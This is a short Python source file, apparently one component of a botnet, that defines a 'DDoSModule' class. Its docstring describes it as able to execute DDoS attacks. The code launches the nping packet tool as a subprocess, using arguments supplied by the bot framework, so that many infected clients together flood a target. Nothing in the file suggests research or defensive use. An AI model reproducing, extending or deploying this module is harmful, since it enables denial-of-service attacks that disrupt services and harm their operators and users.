'''
Created on Dec 21, 2013

@author: Onur
'''

from FeatureModule import FeatureModule
import subprocess
from domain import BotConfig

class DDoSModule(FeatureModule):
    """ The DDoS class which is able to execute a DDoS attack.
        
        Actually, the class is able to run packet based DoS attacks
        using nping tool (the inheritor of the infamous hping tool).
        When multiple clients run the module, it becomes a DDoS situation.
        
        Attributes:
            __nping: The reference of nping subprocess.
    """
    __nping = None    

    def __init__(self):
        """ Initialize with the module name."""
        super(DDoSModule, self).__init__("DDoS")
    
    def start(self, *args):
        """ Creates a subprocess of nping and invokes it
            with the given arguments."""
        cline = [BotConfig.NPING_PATH]
        cline = cline + args[0]
        self.__nping = subprocess.Popen(cline,
                             shell=False,
                             stdout=subprocess.PIPE,
                             stderr=subprocess.PIPE)

        sout, serr = self.__nping.communicate()
        
        #prints the results for debug purposes.
        print sout, serr
    
    def stop(self):
        """ Kills the subprocess."""
        self.__nping.kill()
        
        